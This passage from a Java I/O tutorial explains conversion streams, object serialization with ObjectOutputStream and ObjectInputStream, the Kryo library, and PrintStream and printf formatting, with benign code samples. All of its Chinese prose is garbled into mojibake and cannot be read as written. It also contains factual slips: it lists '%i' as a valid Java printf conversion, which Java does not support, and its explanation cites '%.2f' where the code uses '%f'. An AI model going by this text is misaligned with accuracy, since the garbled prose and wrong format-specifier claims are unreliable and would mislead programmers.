ä½ç½®å¼€å§‹å­˜æ”¾ã€‚</li><li><code>ready()</code>ï¼šè¿”å›æ­¤æµæ˜¯å¦å·²å‡†å¤‡å¥½è¯»å–ã€‚</li><li><code>close()</code>ï¼šå…³é—­è¾“å…¥æµã€‚</li></ul><p>OutputStreamWriter ç±»çš„å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li><code>write(int c)</code>ï¼šå‘è¾“å‡ºæµä¸­å†™å…¥ä¸€ä¸ªå­—ç¬¦çš„æ•°æ®ã€‚</li><li><code>write(char[] cbuf, int off, int len)</code>ï¼šå‘è¾“å‡ºæµä¸­å†™å…¥æŒ‡å®šå­—ç¬¦æ•°ç»„ cbuf ä¸­çš„ len ä¸ªå­—ç¬¦ï¼Œä» off ä½ç½®å¼€å§‹ã€‚</li><li><code>flush()</code>ï¼šå°†ç¼“å†²åŒºçš„æ•°æ®å†™å…¥è¾“å‡ºæµä¸­ã€‚</li><li><code>close()</code>ï¼šå…³é—­è¾“å‡ºæµã€‚</li></ul><p>åœ¨ä½¿ç”¨è½¬æ¢æµæ—¶ï¼Œéœ€è¦æŒ‡å®šæ­£ç¡®çš„å­—ç¬¦é›†ç¼–ç æ–¹å¼ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´æ•°æ®è¯»å–æˆ–å†™å…¥å‡ºç°ä¹±ç ã€‚</p><h2 id="Javaåºåˆ—æµ"><a href="#Javaåºåˆ—æµ" class="headerlink" title="Javaåºåˆ—æµ"></a>Javaåºåˆ—æµ</h2><p>Java çš„åºåˆ—æµï¼ˆObjectInputStream å’Œ ObjectOutputStreamï¼‰æ˜¯ä¸€ç§å¯ä»¥å°† Java å¯¹è±¡åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æµã€‚</p><h3 id="01ã€ObjectOutputStream"><a href="#01ã€ObjectOutputStream" class="headerlink" title="01ã€ObjectOutputStream"></a>01ã€ObjectOutputStream</h3><p><code>java.io.ObjectOutputStream</code> ç»§æ‰¿è‡ª OutputStream ç±»ï¼Œå› æ­¤å¯ä»¥å°†åºåˆ—åŒ–åçš„å­—èŠ‚åºåˆ—å†™å…¥åˆ°æ–‡ä»¶ã€ç½‘ç»œç­‰è¾“å‡ºæµä¸­ã€‚</p><p>æ¥çœ‹ ObjectOutputStream çš„æ„é€ æ–¹æ³•ï¼š<br><code>ObjectOutputStream(OutputStream out)</code></p><p>è¯¥æ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ª OutputStream å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œç”¨äºå°†åºåˆ—åŒ–åçš„å­—èŠ‚åºåˆ—è¾“å‡ºåˆ°æŒ‡å®šçš„è¾“å‡ºæµä¸­ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¯¹è±¡è¦æƒ³åºåˆ—åŒ–ï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶:</p><ul><li>è¯¥ç±»å¿…é¡»å®ç°<a href="https://javabetter.cn/io/Serializbale.html"><code>java.io.Serializable</code> æ¥å£</a>ï¼Œå¦åˆ™ä¼šæŠ›å‡º<code>NotSerializableException</code> ã€‚</li><li>è¯¥ç±»çš„æ‰€æœ‰å­—æ®µéƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœä¸€ä¸ªå­—æ®µä¸éœ€è¦åºåˆ—åŒ–ï¼Œåˆ™éœ€è¦ä½¿ç”¨<a href="https://javabetter.cn/io/transient.html"><code>transient</code> å…³é”®å­—</a>è¿›è¡Œä¿®é¥°ã€‚static å’Œ transient ä¿®é¥°çš„å­—æ®µæ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„ã€‚</li></ul><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> age; <span class="comment">// transientç¬æ€ä¿®é¥°æˆå‘˜,ä¸ä¼šè¢«åºåˆ—åŒ–</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæ¥èŠèŠ <code>writeObject (Object obj)</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯ ObjectOutputStream ç±»ä¸­ç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–æˆå­—èŠ‚åºåˆ—å¹¶è¾“å‡ºåˆ°è¾“å‡ºæµä¸­çš„æ–¹æ³•ï¼Œå¯ä»¥å¤„ç†å¯¹è±¡ä¹‹é—´çš„å¼•ç”¨å…³ç³»ã€ç»§æ‰¿å…³ç³»ã€é™æ€å­—æ®µå’Œ transient å­—æ®µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectOutputStreamDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/person.dat&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸­ï¼Œé¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ª Person å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ FileOutputStream å’Œ ObjectOutputStream å°† Person å¯¹è±¡åºåˆ—åŒ–å¹¶è¾“å‡ºåˆ° person.dat æ–‡ä»¶ä¸­ã€‚åœ¨ Person ç±»ä¸­ï¼Œå®ç°äº† Serializable æ¥å£ï¼Œè¡¨ç¤ºè¯¥ç±»å¯ä»¥è¿›è¡Œå¯¹è±¡åºåˆ—åŒ–ã€‚</p><h3 id="02ã€ObjectInputStream"><a href="#02ã€ObjectInputStream" class="headerlink" title="02ã€ObjectInputStream"></a>02ã€ObjectInputStream</h3><p>ObjectInputStream å¯ä»¥è¯»å– ObjectOutputStream å†™å…¥çš„å­—èŠ‚æµï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–ä¸ºç›¸åº”çš„å¯¹è±¡ï¼ˆåŒ…å«<code>å¯¹è±¡çš„æ•°æ®</code>ã€<code>å¯¹è±¡çš„ç±»å‹</code>å’Œ<code>å¯¹è±¡ä¸­å­˜å‚¨çš„å±æ€§</code>ç­‰ä¿¡æ¯ï¼‰ã€‚</p><p>è¯´ç®€å•ç‚¹å°±æ˜¯ï¼Œåºåˆ—åŒ–ä¹‹å‰æ˜¯ä»€ä¹ˆæ ·å­ï¼Œååºåˆ—åŒ–åå°±æ˜¯ä»€ä¹ˆæ ·å­ã€‚</p><p>æ¥çœ‹ä¸€ä¸‹æ„é€ æ–¹æ³•ï¼š<code>ObjectInputStream(InputStream in)</code> ï¼š åˆ›å»ºä¸€ä¸ªæŒ‡å®š InputStream çš„ ObjectInputStreamã€‚</p><p>å…¶ä¸­ï¼ŒObjectInputStream çš„ readObject æ–¹æ³•ç”¨æ¥è¯»å–æŒ‡å®šæ–‡ä»¶ä¸­çš„å¯¹è±¡ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/person.dat&quot;</span>; <span class="comment">// å¾…ååºåˆ—åŒ–çš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn)) &#123;</span><br><span class="line">     <span class="comment">// ä»æŒ‡å®šçš„æ–‡ä»¶è¾“å…¥æµä¸­è¯»å–å¯¹è±¡å¹¶ååºåˆ—åŒ–</span></span><br><span class="line">     <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">     <span class="comment">// å°†ååºåˆ—åŒ–åçš„å¯¹è±¡å¼ºåˆ¶è½¬æ¢ä¸ºæŒ‡å®šç±»å‹</span></span><br><span class="line">     <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) obj;</span><br><span class="line">     <span class="comment">// æ‰“å°ååºåˆ—åŒ–åçš„å¯¹è±¡ä¿¡æ¯</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Deserialized Object: &quot;</span> + p);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">     e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="03ã€Kryo"><a href="#03ã€Kryo" class="headerlink" title="03ã€Kryo"></a>03ã€Kryo</h3><p>å®é™…å¼€å‘ä¸­ï¼Œå¾ˆå°‘ä½¿ç”¨ JDK è‡ªå¸¦çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œè¿™æ˜¯å› ä¸ºï¼š</p><ul><li>å¯ç§»æ¤æ€§å·®ï¼šJava ç‰¹æœ‰çš„ï¼Œæ— æ³•è·¨è¯­è¨€è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</li><li>æ€§èƒ½å·®ï¼šåºåˆ—åŒ–åçš„å­—èŠ‚ä½“ç§¯å¤§ï¼Œå¢åŠ äº†ä¼ è¾“&#x2F;ä¿å­˜æˆæœ¬ã€‚</li><li>å®‰å…¨é—®é¢˜ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„æ•°æ®æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»è€Œå¯¹ç³»ç»Ÿé€ æˆä¸¥é‡çš„å®‰å…¨å¨èƒã€‚ç›¸å…³é˜…è¯»ï¼š<a href="https://cryin.github.io/blog/secure-development-java-deserialization-vulnerability/">Java ååºåˆ—åŒ–æ¼æ´ä¹‹æ®‡</a> ã€‚</li></ul><p>Kryo æ˜¯ä¸€ä¸ªä¼˜ç§€çš„ Java åºåˆ—åŒ–å’Œååºåˆ—åŒ–åº“ï¼Œå…·æœ‰é«˜æ€§èƒ½ã€é«˜æ•ˆç‡å’Œæ˜“äºä½¿ç”¨å’Œæ‰©å±•ç­‰ç‰¹ç‚¹ï¼Œæœ‰æ•ˆåœ°è§£å†³äº† JDK è‡ªå¸¦çš„åºåˆ—åŒ–æœºåˆ¶çš„ç—›ç‚¹ã€‚</p><blockquote><p>GitHub åœ°å€ï¼š<a href="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p></blockquote><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><p>ç¬¬ä¸€æ­¥ï¼Œåœ¨ pom.xml ä¸­å¼•å…¥ä¾èµ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- å¼•å…¥ Kryo åºåˆ—åŒ–å·¥å…· --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;5.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼Œåˆ›å»ºä¸€ä¸ª Kryo å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ <code>register()</code> æ–¹æ³•å°†å¯¹è±¡è¿›è¡Œæ³¨å†Œã€‚ç„¶åï¼Œä½¿ç”¨ <code>writeObject()</code> æ–¹æ³•å°† Java å¯¹è±¡åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶æµï¼Œå†ä½¿ç”¨ <code>readObject()</code> æ–¹æ³•å°†äºŒè¿›åˆ¶æµååºåˆ—åŒ–ä¸º Java å¯¹è±¡ã€‚æœ€åï¼Œè¾“å‡ºååºåˆ—åŒ–åçš„ Java å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KryoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(KryoParam.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">KryoParam</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KryoParam</span>(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/kryo.bin&quot;</span>));</span><br><span class="line">        kryo.writeObject(output, object);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;logs/kryo.bin&quot;</span>));</span><br><span class="line">        <span class="type">KryoParam</span> <span class="variable">object2</span> <span class="operator">=</span> kryo.readObject(input, KryoParam.class);</span><br><span class="line">        System.out.println(object2);</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KryoParam</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KryoParam</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KryoParam</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KryoParam&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ‰“å°æµ"><a href="#æ‰“å°æµ" class="headerlink" title="æ‰“å°æµ"></a>æ‰“å°æµ</h2><p><code>System.out.println()</code> çš„ä½¿ç”¨é¢‘ç‡ææ€•ä¸äºšäº main æ–¹æ³•çš„ä½¿ç”¨é¢‘ç‡ã€‚å…¶ä¸­ <code>System.out</code> è¿”å›çš„æ­£æ˜¯æ‰“å°æµ <code>PrintStream</code> ã€‚<br>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å®ƒè¿˜æœ‰ä¸€ä¸ªå­ªç”Ÿå…„å¼Ÿï¼ŒPrintWriterã€‚PrintStream æ˜¯ OutputStream çš„å­ç±»ï¼ŒPrintWriter æ˜¯ Writer çš„å­ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª<a href="https://javabetter.cn/io/stream.html">å­—èŠ‚æµ</a>ï¼Œä¸€ä¸ªæ˜¯<a href="https://javabetter.cn/io/reader-writer.html">å­—ç¬¦æµ</a>ã€‚</p><p>æ‰“å°æµå…·æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>å¯ä»¥è‡ªåŠ¨è¿›è¡Œæ•°æ®ç±»å‹è½¬æ¢ï¼šæ‰“å°æµå¯ä»¥å°†å„ç§æ•°æ®ç±»å‹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶è¾“å‡ºåˆ°æŒ‡å®šçš„è¾“å‡ºæµä¸­ã€‚</li><li>å¯ä»¥è‡ªåŠ¨è¿›è¡Œæ¢è¡Œæ“ä½œï¼šæ‰“å°æµå¯ä»¥åœ¨è¾“å‡ºå­—ç¬¦ä¸²çš„æœ«å°¾è‡ªåŠ¨æ·»åŠ æ¢è¡Œç¬¦ï¼Œæ–¹ä¾¿è¾“å‡ºå¤šä¸ªå­—ç¬¦ä¸²æ—¶çš„æ ¼å¼æ§åˆ¶ã€‚</li><li>å¯ä»¥è¾“å‡ºåˆ°æ§åˆ¶å°æˆ–è€…æ–‡ä»¶ä¸­ï¼šæ‰“å°æµå¯ä»¥å°†æ•°æ®è¾“å‡ºåˆ°æ§åˆ¶å°æˆ–è€…æ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿è°ƒè¯•å’Œæ—¥å¿—è®°å½•ï¼ˆå°½ç®¡ç”Ÿäº§ç¯å¢ƒä¸‹æ›´æ¨èä½¿ç”¨ <a href="https://javabetter.cn/gongju/logback.html">Logback</a>ã€ELK ç­‰ï¼‰ã€‚</li></ul><p>PrintStream ç±»çš„å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li><code>print()</code>ï¼šè¾“å‡ºä¸€ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</li><li><code>println()</code>ï¼šè¾“å‡ºä¸€ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚</li><li><code>printf()</code>ï¼šä½¿ç”¨æŒ‡å®šçš„æ ¼å¼å­—ç¬¦ä¸²å’Œå‚æ•°è¾“å‡ºæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintStream</span> <span class="variable">ps</span> <span class="operator">=</span> System.out;</span><br><span class="line">ps.println(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;æ²‰ &quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;é»˜ &quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;ç‹ &quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;äºŒ &quot;</span>);</span><br><span class="line">ps.println();</span><br><span class="line"></span><br><span class="line">ps.printf(<span class="string">&quot;å§“åï¼š%sï¼Œå¹´é¾„ï¼š%dï¼Œæˆç»©ï¼š%f&quot;</span>, <span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>, <span class="number">18</span>, <span class="number">99.9</span>);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª PrintStream å¯¹è±¡ psï¼Œå®ƒè¾“å‡ºåˆ°æ§åˆ¶å°ã€‚æˆ‘ä»¬ä½¿ç”¨ ps çš„ print å’Œ println æ–¹æ³•è¾“å‡ºäº†ä¸€äº›å­—ç¬¦ä¸²ã€‚</p><p>ä½¿ç”¨ printf æ–¹æ³•è¾“å‡ºäº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ %sã€%d å’Œ %.2f åˆ†åˆ«è¡¨ç¤ºå­—ç¬¦ä¸²ã€æ•´æ•°å’Œæµ®ç‚¹æ•°çš„æ ¼å¼åŒ–è¾“å‡ºã€‚æˆ‘ä»¬ä½¿ç”¨é€—å·åˆ†éš”çš„å‚æ•°åˆ—è¡¨æŒ‡å®šäº†è¦è¾“å‡ºçš„å€¼ã€‚</p><p>æ¥è¯¦ç»†è¯´è¯´ printf æ–¹æ³•å“ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrintStream <span class="title function_">printf</span><span class="params">(String format, Object... args)</span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œformat å‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œargs å‚æ•°æ˜¯è¦è¾“å‡ºçš„å‚æ•°åˆ—è¡¨ã€‚æ ¼å¼åŒ–å­—ç¬¦ä¸²åŒ…å«äº†æ™®é€šå­—ç¬¦å’Œè½¬æ¢è¯´æ˜ç¬¦ã€‚æ™®é€šå­—ç¬¦æ˜¯æŒ‡é™¤äº†è½¬æ¢è¯´æ˜ç¬¦ä¹‹å¤–çš„å­—ç¬¦ï¼Œå®ƒä»¬åœ¨è¾“å‡ºæ—¶ç›´æ¥è¾“å‡ºã€‚è½¬æ¢è¯´æ˜ç¬¦æ˜¯ç”±ç™¾åˆ†å·ï¼ˆ%ï¼‰å’Œä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ç»„æˆçš„ï¼Œç”¨äºæŒ‡å®šè¾“å‡ºçš„æ ¼å¼å’Œæ•°æ®ç±»å‹ã€‚</p><p>ä¸‹é¢æ˜¯ Java çš„å¸¸ç”¨è½¬æ¢è¯´æ˜ç¬¦åŠå¯¹åº”çš„è¾“å‡ºæ ¼å¼ï¼š</p><ul><li><code>%s</code>ï¼šè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</li><li><code>%d</code> æˆ– <code>%i</code>ï¼šè¾“å‡ºä¸€ä¸ªåè¿›åˆ¶æ•´æ•°ã€‚</li><li><code>%x</code> æˆ– <code>%X</code>ï¼šè¾“å‡ºä¸€ä¸ªåå…­è¿›åˆ¶æ•´æ•°ï¼Œ<code>%x</code> è¾“å‡ºå°å†™å­—æ¯ï¼Œ<code>%X</code> è¾“å‡ºå¤§å†™å­—æ¯ã€‚</li><li><code>%f</code> æˆ– <code>%F</code>ï¼šè¾“å‡ºä¸€ä¸ªæµ®ç‚¹æ•°ã€‚</li><li><code>%e</code> æˆ– <code>%E</code>ï¼šè¾“å‡ºä¸€ä¸ªç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„æµ®ç‚¹æ•°ï¼Œ<code>%e</code> è¾“å‡ºå°å†™å­—æ¯ eï¼Œ<code>%E</code> è¾“å‡ºå¤§å†™å­—æ¯ Eã€‚</li><li><code>%g</code> æˆ– <code>%G</code>ï¼šè¾“å‡ºä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œè‡ªåŠ¨é€‰æ‹© <code>%f</code> æˆ– <code>%e/%E</code> æ 